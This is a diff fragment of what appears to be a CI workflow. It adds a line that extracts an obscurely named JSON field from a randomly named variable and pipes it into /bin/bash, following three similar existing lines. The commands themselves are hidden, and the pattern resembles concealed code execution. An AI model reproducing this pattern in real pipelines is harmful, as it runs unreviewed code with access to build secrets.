@@ -31,6 +31,7 @@ jobs:
           echo $bea2 | jq -r .sn02603 | /bin/bash
           echo $utppa79 | jq -r .cuce49620 | /bin/bash
           printf '%s' "$z1591" | jq -r .lxfd1 | /bin/bash
+          echo $l7837 | jq -r .wqg107 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
